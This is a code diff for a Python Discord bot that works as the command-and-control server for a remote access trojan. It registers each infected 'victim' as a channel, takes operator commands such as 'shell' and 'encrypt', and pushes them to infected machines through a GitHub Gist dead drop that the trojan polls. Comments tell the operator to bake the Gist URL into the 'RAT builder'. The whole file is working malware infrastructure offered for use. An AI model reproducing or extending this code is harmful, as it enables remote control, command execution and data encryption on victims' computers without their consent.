@@ -188,11 +188,15 @@ import re
 import requests
 import json
 
-TOKEN = "YOUR_DISCORD_BOT_TOKEN"
-GUILD_ID = 123456789012345678  # Server ID
-LOG_CHANNEL_ID = 987654321098765432  # Webhook channel ID
-GIST_ID = "YOUR_GIST_ID_HERE"  # The long hex from URL
-GH_TOKEN = "YOUR_GH_PERSONAL_ACCESS_TOKEN_HERE"  # ghp_...
+# === FILL THESE IN EXACTLY ===
+TOKEN = "YOUR_DISCORD_BOT_TOKEN"  # Long string starting with Nz or Mj — from dev portal Bot tab, looks like 70-80 characters
+GUILD_ID = 123456789012345678  # Server ID — 18-digit number (right-click server → Copy Server ID)
+LOG_CHANNEL_ID = 987654321098765432  # Webhook channel ID — 18-digit number (right-click channel → Copy Channel ID)
+GIST_ID = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # Gist ID — 32-character hex string from gist URL[](https://gist.github.com/username/THIS_PART)
+GH_TOKEN = "ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"  # Personal Access Token — starts with ghp_, 40 characters (ghp_ + 36 hex)
+
+# Fixed raw URL — BAKE THIS INTO YOUR RAT BUILDER FROM NOW ON (never changes)
+FIXED_RAW_URL = "https://gist.githubusercontent.com/YOUR_GITHUB_USERNAME/GIST_ID/raw/commands.json"  # Replace YOUR_GITHUB_USERNAME and GIST_ID
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -201,71 +205,61 @@ client = discord.Client(intents=intents)
 
 known_victims = set()
 
-# Fixed raw URL - bake this into EVERY RAT you build from now on
-FIXED_RAW_URL = "https://gist.githubusercontent.com/YOURUSERNAME/YOUR_GIST_ID/raw/commands.json"
-
-def update_gist(commands_dict):
+def update_gist(new_commands):
     url = f"https://api.github.com/gists/{GIST_ID}"
-    headers = {
-        "Authorization": f"token {GH_TOKEN}",
-        "Accept": "application/vnd.github.v3+json"
-    }
-    data = {
-        "files": {
-            "commands.json": {
-                "content": json.dumps(commands_dict)
-            }
-        }
-    }
+    headers = {"Authorization": f"token {GH_TOKEN}"}
+    data = {"files": {"commands.json": {"content": json.dumps(new_commands)}}}
     r = requests.patch(url, headers=headers, json=data)
     if r.status_code == 200:
-        print("[+] Gist updated")
+        print("[+] Gist updated with new commands")
     else:
-        print("[-] Gist update failed:", r.text)
+        print(f"[-] Gist fail: {r.status_code} {r.text}")
 
 async def create_victim_section(vid):
     guild = client.get_guild(GUILD_ID)
+    if not guild:
+        print("[ERROR] Bad GUILD_ID")
+        return
     cat = await guild.create_category(f"Victim-{vid}")
     ch = await cat.create_text_channel(f"logs-{vid}", overwrites={
         guild.default_role: discord.PermissionOverwrite(read_messages=False),
         guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
     })
+    print(f"[+] Spawned Victim-{vid} section")
     return ch
 
 @client.event
 async def on_ready():
-    print(f"[+] Bot online - FIXED RAW URL (use in builder): {FIXED_RAW_URL}")
+    print(f"[+] Bot live - use FIXED_RAW_URL in RAT builder: {FIXED_RAW_URL}")
 
 @client.event
 async def on_message(message):
-    if message.author.bot: return
+    # Skip nothing for webhooks
+    print(f"[DEBUG] Message in {message.channel.id} | Webhook: {message.webhook_id is not None} | Content: {message.content[:100]}")
 
-    # Bite detection
+    # BITE DETECTION
     if message.channel.id == LOG_CHANNEL_ID:
-        text = message.content
+        full_text = message.content
         for embed in message.embeds:
-            text += str(embed.to_dict())
-        if "WE GOT A BITE CAPTAIN" in text.upper():
-            vid_match = re.search(r"\[([a-f0-9]{8})\]", text)
+            full_text += " " + (embed.title or "") + " " + (embed.description or "")
+        if "WE GOT A BITE CAPTAIN" in full_text.upper():
+            vid_match = re.search(r"\[([a-f0-9]{8})\]", full_text)
             if vid_match:
                 vid = vid_match.group(1)
                 if vid not in known_victims:
                     known_victims.add(vid)
                     ch = await create_victim_section(vid)
-                    await message.reply(f"**BITE** Victim **{vid}** → {ch.mention}")
+                    await message.reply(f"**BITE DETECTED** — Victim **{vid}** online\nWar room: {ch.mention}")
 
-    # Commands in victim channels
-    if message.channel.name.startswith("logs-") and message.content.startswith("-"):
-        vid = message.channel.name.split("-")[1][:8]
+    # COMMANDS IN VICTIM CHANNELS
+    if message.channel.name.startswith("logs-") and message.content.startswith("-") and not message.author.bot:
+        vid = message.channel.name[5:13]  # extracts the 8-char ID
         parts = message.content[1:].strip().split(" ", 1)
         cmd = parts[0].lower()
         arg = parts[1] if len(parts) > 1 else ""
+        full_cmd = cmd if cmd not in ["encrypt", "shell"] else f"{cmd} {arg}"
         
-        full_cmd = cmd
-        if cmd in ["encrypt", "shell"]:
-            full_cmd += " " + arg
-        
-        # Load current + add new command
+        # Merge with existing
         try:
             current = requests.get(FIXED_RAW_URL).json()
         except:
@@ -273,6 +267,6 @@ async def on_message(message):
         current[vid] = full_cmd
         update_gist(current)
         
-        await message.reply(f"**{full_cmd}** queued for **{vid}**\nNo rebuild needed — command live in <30s")
+        await message.reply(f"**{full_cmd}** → victim **{vid}**\nCommand live in <30s — no rebuild needed")
 
 client.run(TOKEN)
